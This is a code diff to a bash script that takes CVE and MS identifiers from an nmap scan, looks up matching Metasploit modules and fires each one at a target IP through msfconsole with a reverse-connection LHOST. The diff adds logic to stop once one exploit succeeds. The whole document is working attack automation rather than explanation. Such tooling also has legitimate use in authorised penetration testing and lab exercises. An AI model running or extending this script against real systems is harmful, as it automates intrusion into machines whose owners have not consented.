@@ -128,6 +128,7 @@ total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan
 
 # Loop through each CVE and MS value found and search for exploits
 count=0
+exploit_executed=false
 
 while read vuln
 do  
@@ -156,11 +157,12 @@ do
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
                 echo "Using exploit $exploit"
-                msfconsole -q -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run"
+                msfconsole -q -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run;"
                 if [ $? -eq 0 ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
                     exploitsFound=1
+                    exploit_executed=true
                     break
                 else
                     echo "Failed to exploit vulnerability $vuln using exploit $exploit"
@@ -185,7 +187,14 @@ do
     for ((i=percentage; i<100; i+=2)); do printf " "; done
     printf "] $percentage%%\r"
 
+    # Check if an exploit has been successfully executed
+    if [ "$exploit_executed" = true ]
+    then
+        break
+    fi
+
 done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"
+
 
 
 if [ $exploitsFound = 0 ]
